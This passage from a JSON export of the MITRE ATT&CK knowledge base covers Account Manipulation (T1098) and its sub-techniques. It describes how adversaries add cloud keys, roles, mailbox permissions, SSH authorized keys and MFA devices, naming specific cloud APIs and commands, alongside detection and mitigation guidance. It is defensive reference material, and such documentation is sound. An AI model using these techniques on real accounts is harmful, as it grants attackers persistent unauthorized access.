Configuration","description":"Disable legacy authentication, which does not support MFA, and require the use of modern authentication protocols instead."},{"id":"M1017","name":"User Training","description":"Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."},{"id":"M1018","name":"User Account Management","description":"Periodically review user accounts and remove those that are inactive or unnecessary. Limit the ability for user accounts to create additional accounts."},{"id":"M1026","name":"Privileged Account Management","description":"Review privileged cloud account permission levels routinely to look for those that could allow an adversary to gain wide access, such as Global Administrator and Privileged Role Administrator in Azure AD. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> <a href=\"https://learn.microsoft.com/en-us/security/benchmark/azure/baselines/aad-security-baseline\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure security baseline for Azure Active Directory)</a> These reviews should also check if new privileged cloud accounts have been created that were not authorized. For example, in Azure AD environments configure alerts to notify when accounts have gone many days without using privileged roles, as these roles may be able to be removed. <a href=\"https://learn.microsoft.com/en-us/security/benchmark/azure/baselines/aad-security-baseline\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Security Alerts for Azure AD Roles)</a> Consider using temporary, just-in-time (JIT) privileged access to Azure AD resources rather than permanently assigning privileged roles. <a href=\"https://learn.microsoft.com/en-us/security/benchmark/azure/baselines/aad-security-baseline\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure security baseline for Azure Active Directory)</a>"},{"id":"M1027","name":"Password Policies","description":"Ensure that cloud accounts, particularly privileged accounts, have complex, unique passwords across all systems on the network. Passwords and access keys should be rotated regularly. This limits the amount of time credentials can be used to access resources if a credential is compromised without your knowledge. Cloud service providers may track access key age to help audit and identify keys that may need to be rotated. <a href=\"https://aws.amazon.com/blogs/security/newly-updated-features-in-the-aws-iam-console-help-you-adhere-to-iam-best-practices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS - IAM Console Best Practices)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for cloud accounts, especially privileged accounts. This can be implemented in a variety of forms (e.g. hardware, virtual, SMS), and can also be audited using administrative reporting features. <a href=\"https://aws.amazon.com/blogs/security/newly-updated-features-in-the-aws-iam-console-help-you-adhere-to-iam-best-practices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS - IAM Console Best Practices)</a>"},{"id":"M1036","name":"Account Use Policies","description":"Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-conditional-access-policy-common\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Common Conditional Access Policies)</a>"}]}]},{"id":"T1098","name":"Account Manipulation","description":"Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. <a href=\"https://www.fireeye.com/blog/threat-research/2021/06/darkside-affiliate-supply-chain-software-compromise.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye SMOKEDHAM June 2021)</a> These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. \n\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged Valid Accounts.","detection":"Collect events that correlate with changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4738\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft User Modified Event)</a> <a href=\"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4670\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Security Event 4670)</a> <a href=\"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4670\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Security Event 4670)</a> Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ <a href=\"https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: InsiderThreat ChangeNTLM July 2017)</a> or that include additional flags such as changing a password without knowledge of the old password. <a href=\"https://github.com/gentilkiwi/mimikatz/issues/92\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Mimikatz Issue 92 June 2017)</a>\n\nMonitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.\n\nMonitor for unusual permissions changes that may indicate excessively broad permissions being granted to compromised accounts. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged Valid Accounts","platforms":["Containers","ESXi","IaaS","Identity Provider","Linux","macOS","Network Devices","Office Suite","SaaS","Windows"],"dataSources":["Command: Command Execution","Process: Process Creation","Active Directory: Active Directory Object Modification","File: File Modification","Group: Group Modification","User Account: User Account Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure that low-privileged user accounts do not have permissions to modify accounts or account-related policies."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict access to potentially sensitive files that deal with authentication and/or authorization."},{"id":"M1026","name":"Privileged Account Management","description":"Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."},{"id":"M1028","name":"Operating System Configuration","description":"Protect domain controllers by ensuring proper security configuration for critical servers to limit access by potentially unnecessary protocols and services, such as SMB file sharing."},{"id":"M1030","name":"Network Segmentation","description":"Configure access controls and firewalls to limit access to critical systems and domain controllers. Most cloud environments support separate virtual private cloud (VPC) instances that enable further segmentation of cloud systems."},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Remove unnecessary and potentially abusable authentication and authorization mechanisms where possible."}],"subTechniques":[{"id":"T1098.001","name":"Additional Cloud Credentials","description":"Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\n\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure / Entra ID. <a href=\"https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SolarWinds Customer Guidance)</a> <a href=\"https://speakerdeck.com/tweekfawkes/blue-cloud-of-death-red-teaming-azure-1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Blue Cloud of Death)</a> <a href=\"https://www.youtube.com/watch?v=wQ1CuAPnrLM&feature=youtu.be&t=2815\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Blue Cloud of Death Video)</a> These credentials include both x509 keys and passwords. <a href=\"https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SolarWinds Customer Guidance)</a> With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules. <a href=\"https://nedinthecloud.com/2019/07/16/demystifying-azure-ad-service-principals/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Demystifying Azure AD Service Principals)</a>\n\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through Cloud Accounts, adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP. <a href=\"https://cloud.google.com/sdk/gcloud/reference/compute/os-login/ssh-keys/add\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GCP SSH Key Add)</a> This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts. <a href=\"https://expel.io/blog/finding-evil-in-aws/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Expel IO Evil in AWS)</a> <a href=\"https://expel.io/blog/behind-the-scenes-expel-soc-alert-aws/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Expel Behind the Scenes)</a>\n\nAdversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. Alternatively, they may use the <code>CreateLoginProfile</code> API in AWS to add a password that can be used to log into the AWS Management Console for Cloud Service Dashboard. <a href=\"https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Permiso Scattered Spider 2023)</a> <a href=\"https://www.lacework.com/blog/detecting-ai-resource-hijacking-with-composite-alerts\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lacework AI Resource Hijacking 2024)</a> If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. Cloud Accounts). <a href=\"https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rhino Security Labs AWS Privilege Escalation)</a> <a href=\"https://sysdig.com/blog/scarleteel-2-0/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sysdig ScarletEel 2.0)</a> For example, in Entra ID environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal’s roles and permissions, which may be different from those of the Application Administrator. <a href=\"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpecterOps Azure Privilege Escalation)</a> \n\nIn AWS environments, adversaries with the appropriate permissions may also use the <code>sts:GetFederationToken</code> API call to create a temporary set of credentials to Forge Web Credentials tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account’s API credentials are deactivated. <a href=\"https://www.crowdstrike.com/blog/how-adversaries-persist-with-aws-user-federation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike AWS User Federation Persistence)</a>\n\nIn Entra ID environments with the app password feature enabled, adversaries may be able to add an app password to a user account. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/untangling-iran-apt42-operations\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT42 Operations 2024)</a> As app passwords are intended to be used with legacy devices that do not support multi-factor authentication (MFA), adding an app password can allow an adversary to bypass MFA requirements. Additionally, app passwords may remain valid even if the user’s primary password is reset. <a href=\"https://learn.microsoft.com/en-us/entra/identity/authentication/howto-mfa-app-passwords\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Entra ID App Passwords)</a>","detection":"Monitor Azure Activity Logs for Service Principal and Application modifications. Monitor for the usage of APIs that create or import SSH keys, particularly by unexpected users or accounts such as the root account.\n\nMonitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.","platforms":["IaaS","Identity Provider","SaaS"],"dataSources":["User Account: User Account Modification","Active Directory: Active Directory Object Creation","Active Directory: Active Directory Object Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure that low-privileged user accounts do not have permission to add access keys to accounts. In AWS environments, prohibit users from calling the <code>sts:GetFederationToken</code> API unless explicitly required. <a href=\"https://www.crowdstrike.com/blog/how-adversaries-persist-with-aws-user-federation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike AWS User Federation Persistence)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Do not allow domain administrator or root accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."},{"id":"M1030","name":"Network Segmentation","description":"Configure access controls and firewalls to limit access to critical systems and domain controllers. Most cloud environments support separate virtual private cloud (VPC) instances that enable further segmentation of cloud systems."},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts. Consider enforcing multi-factor authentication for the <code>CreateKeyPair</code> and <code>ImportKeyPair</code> API calls through IAM policies. <a href=\"https://expel.io/blog/finding-evil-in-aws/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Expel IO Evil in AWS)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Remove unnecessary and potentially abusable authentication mechanisms where possible. For example, in Entra ID environments, disable the app password feature unless explicitly required."}]},{"id":"T1098.002","name":"Additional Email Delegate Permissions","description":"Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. \n\nFor example, the <code>Add-MailboxPermission</code> PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox. <a href=\"https://docs.microsoft.com/en-us/powershell/module/exchange/mailboxes/add-mailboxpermission?view=exchange-ps\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Add-MailboxPermission)</a> <a href=\"https://www.fireeye.com/content/dam/collateral/en/mtrends-2018.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye APT35 2018)</a> <a href=\"https://www.crowdstrike.com/blog/hiding-in-plain-sight-using-the-office-365-activities-api-to-investigate-business-email-compromises/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike Hiding in Plain Sight 2018)</a> In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings. <a href=\"https://support.google.com/a/answer/7223765?hl=en\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Gmail Delegation)</a> <a href=\"https://googleblog.blogspot.com/2011/06/ensuring-your-information-is-safe.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Ensuring Your Information is Safe)</a> \n\nAdversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders. <a href=\"https://www.mandiant.com/resources/blog/remediation-and-hardening-strategies-for-microsoft-365-to-defend-against-unc2452\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Defend UNC2452 White Paper)</a>\n\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add Additional Cloud Roles to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: Internal Spearphishing), so the messages evade spam/phishing detection mechanisms. <a href=\"https://www.slideshare.net/DouglasBienstock/shmoocon-2019-becs-and-beyond-investigating-and-defending-office-365\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bienstock, D. - Defending O365 - 2019)</a>","detection":"Monitor for unusual Exchange and Office 365 email account permissions changes that may indicate excessively broad permissions being granted to compromised accounts.\n\nEnable the UpdateFolderPermissions action for all logon types. The mailbox audit log will forward folder permission modification events to the Unified Audit Log. Create rules to alert on ModifyFolderPermissions operations where the Anonymous or Default user is assigned permissions other than None. \n\nA larger than normal volume of emails sent from an account and similar phishing emails sent from  real accounts within a network may be a sign that an account was compromised and attempts to leverage access with modified email permissions is occurring.","platforms":["Windows","Office Suite"],"dataSources":["Group: Group Modification","Application Log: Application Log Content","User Account: User Account Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"If email delegation is not required, disable it. In Google Workspace this can be accomplished through the Google Admin console. <a href=\"https://support.google.com/a/answer/7223765?hl=en\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Gmail Delegation)</a>"}]},{"id":"T1098.003","name":"Additional Cloud Roles","description":"An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS IAM Policies and Permissions)</a> <a href=\"https://cloud.google.com/iam/docs/policies\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud IAM Policies)</a> <a href=\"https://support.office.com/en-us/article/add-another-admin-f693489f-9f55-4bd0-a637-a81ce93de22d\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Support O365 Add Another Admin, October 2019)</a> <a href=\"https://docs.microsoft.com/en-us/office365/admin/add-users/about-admin-roles?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft O365 Admin Roles)</a> With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins). <a href=\"https://expel.com/blog/incident-report-from-cli-to-console-chasing-an-attacker-in-aws/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Expel AWS Attacker)</a> <a href=\"https://docs.microsoft.com/en-us/office365/admin/add-users/about-admin-roles?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft O365 Admin Roles)</a> \n\nThis account modification may immediately follow Create Account or other malicious account activity. Adversaries may also modify existing Valid Accounts that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account. <a href=\"https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rhino Security Labs AWS Privilege Escalation)</a>\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to Create Account or modify a victim-owned account. <a href=\"https://www.invictus-ir.com/news/the-curious-case-of-dangerdev-protonmail-me\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Invictus IR DangerDev 2024)</a>","detection":"Collect activity logs from IAM services and cloud administrator accounts to identify unusual activity in the assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.","platforms":["IaaS","Identity Provider","Office Suite","SaaS"],"dataSources":["User Account: User Account Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure that low-privileged user accounts do not have permissions to add permissions to accounts or update IAM policies."},{"id":"M1026","name":"Privileged Account Management","description":"Ensure that all accounts use the least privileges they require. In Azure AD environments, consider using Privileged Identity Management (PIM) to define roles that require two or more approvals before assignment to users. <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/privileged-identity-management/azure-ad-pim-approval-workflow\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Requests for Azure AD Roles in Privileged Identity Management)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts."}]},{"id":"T1098.004","name":"SSH Authorized Keys","description":"Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions, macOS, and ESXi hypervisors commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&amp;lt;user-home&amp;gt;/.ssh/authorized_keys</code> (or, on ESXi, <code>/etc/ssh/keys-&lt;username&gt;/authorized_keys</code>). <a href=\"https://www.ssh.com/ssh/authorized_keys/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SSH Authorized Keys)</a> Users may edit the system’s SSH config file to modify the directives <code>PubkeyAuthentication</code> and <code>RSAAuthentication</code> to the value <code>yes</code> to ensure public key and RSA authentication are enabled, as well as modify the directive <code>PermitRootLogin</code> to the value <code>yes</code> to enable root authentication via SSH. <a href=\"https://knowledge.broadcom.com/external/article/313767/allowing-ssh-access-to-vmware-vsphere-es.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Broadcom ESXi SSH)</a> The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.\n\nAdversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI’s “add-metadata” command an adversary may add SSH keys to a user account. <a href=\"https://cloud.google.com/sdk/gcloud/reference/compute/instances/add-metadata\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Add Metadata)</a> <a href=\"https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Privilege Escalation)</a> Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API. <a href=\"https://docs.microsoft.com/en-us/rest/api/compute/virtual-machines/update\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure Update Virtual Machines)</a> This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH. <a href=\"https://www.venafi.com/blog/growing-abuse-ssh-keys-commodity-malware-campaigns-now-equipped-ssh-capabilities\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Venafi SSH Key Abuse)</a> <a href=\"https://www.cybereason.com/blog/new-pervasive-worm-exploiting-linux-exim-server-vulnerability\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cybereason Linux Exim Worm)</a> It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user.\n\nWhere authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. \n\nSSH keys can also be added to accounts on network devices, such as with the <code>ip ssh pubkey-chain</code> Network Device CLI command. <a href=\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/security/d1/sec-d1-cr-book/sec-cr-i3.html#wp1254331478\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: cisco_ip_ssh_pubkey_ch_cmd)</a>","detection":"Use file integrity monitoring to detect changes made to the <code>authorized_keys</code> file for each user on a system. Monitor for suspicious processes modifying the <code>authorized_keys</code> file. In cloud environments, monitor instances for modification of metadata and configurations.\n\nMonitor for changes to and suspicious processes modifiying <code>/etc/ssh/sshd_config</code>.\n\nFor network infrastructure devices, collect AAA logging to monitor for rogue SSH keys being added to accounts.","platforms":["ESXi","IaaS","Linux","macOS","Network Devices"],"dataSources":["Command: Command Execution","Process: Process Creation","File: File Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"In cloud environments, ensure that only users who explicitly require the permissions to update instance metadata or configurations can do so."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict access to the <code>authorized_keys</code> file."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable SSH if it is not necessary on a host or restrict SSH access for specific users/groups using <code>/etc/ssh/sshd_config</code>. Setting the <code>PermitRootLogin</code> directive to <code>no</code> will prevent the root user from logging in via SSH. <a href=\"https://knowledge.broadcom.com/external/article/313767/allowing-ssh-access-to-vmware-vsphere-es.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Broadcom ESXi SSH)</a>"}]},{"id":"T1098.005","name":"Device Registration","description":"Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.\n\nMFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user’s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network. <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa22-074a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA MFA PrintNightmare)</a> <a href=\"https://www.darkreading.com/threat-intelligence/fireeye-s-mandia-severity-zero-alert-led-to-discovery-of-solarwinds-attack\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DarkReading FireEye SolarWinds)</a> In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. <a href=\"https://www.mandiant.com/resources/blog/apt29-continues-targeting-microsoft\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT29 Microsoft 365 2022)</a>\n\nSimilarly, an adversary with existing access to a network may register a device or a virtual machine to Entra ID and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies. <a href=\"https://o365blog.com/post/devices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AADInternals - Device Registration)</a> <a href=\"https://o365blog.com/post/mdm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AADInternals - Conditional Access Bypass)</a> <a href=\"https://www.microsoft.com/security/blog/2022/03/22/dev-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DEV-0537)</a> <a href=\"https://expel.com/blog/observing-atlas-lion-part-one/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Expel Atlas Lion 2025)</a>\n\nDevices registered in Entra ID may be able to conduct Internal Spearphishing campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client. <a href=\"https://www.microsoft.com/security/blog/2022/01/26/evolved-phishing-device-registration-trick-adds-to-phishers-toolbox-for-victims-without-mfa\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Device Registration)</a> Additionally, an adversary may be able to perform a Service Exhaustion Flood on an Entra ID tenant by registering a large number of devices. <a href=\"https://o365blog.com/post/bprt/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AADInternals - BPRT)</a>","detection":"","platforms":["Windows","Identity Provider"],"dataSources":["Application Log: Application Log Content","Active Directory: Active Directory Object Creation","User Account: User Account Modification"],"mitigations":[{"id":"M1032","name":"Multi-factor Authentication","description":"Require multi-factor authentication to register devices in Entra ID. <a href=\"https://www.microsoft.com/security/blog/2022/01/26/evolved-phishing-device-registration-trick-adds-to-phishers-toolbox-for-victims-without-mfa\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Device Registration)</a> Configure multi-factor authentication systems to disallow enrolling new devices for inactive accounts. <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa22-074a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA MFA PrintNightmare)</a> When first enrolling MFA, use conditional access policies to restrict device enrollment to trusted locations or devices, and consider using temporary access passes as an initial MFA solution to enroll a device. <a href=\"https://www.mandiant.com/resources/blog/apt29-continues-targeting-microsoft\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT29 Microsoft 365 2022)</a>"}]},{"id":"T1098.006","name":"Additional Container Cluster Roles","description":"An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account. <a href=\"https://kubernetes.io/docs/concepts/security/rbac-good-practices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes RBAC)</a> <a href=\"https://blog.aquasec.com/leveraging-kubernetes-rbac-to-backdoor-clusters\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Aquasec Kubernetes Attack 2023)</a> Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions. <a href=\"https://kubernetes.io/docs/reference/access-authn-authz/abac/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kuberentes ABAC)</a>\n \nThis account modification may immediately follow Create Account or other malicious account activity. Adversaries may also modify existing Valid Accounts that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments. <a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/iam\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Kubernetes IAM)</a> <a href=\"https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS EKS IAM Roles for Service Accounts)</a> <a href=\"https://learn.microsoft.com/en-us/azure/aks/concepts-identity\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure Kubernetes Service Service Accounts)</a> In these cases, this technique may be used in conjunction with Additional Cloud Roles.","detection":"","platforms":["Containers"],"dataSources":["User Account: User Account Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure that low-privileged accounts do not have permissions to add permissions to accounts or to update container cluster roles."},{"id":"M1032","name":"Multi-factor Authentication","description":"Require multi-factor authentication for user accounts integrated into container clusters through cloud deployments or via authentication protocols such as LDAP or SAML."}]},{"id":"T1098.007","name":"Additional Local or Domain Groups","description":"An adversary may add additional local or domain groups to an adversary-controlled account to maintain persistent access to a system or domain.\n\nOn Windows, accounts may use the <code>net localgroup</code> and <code>net group</code> commands to add existing users to local and domain groups. <a 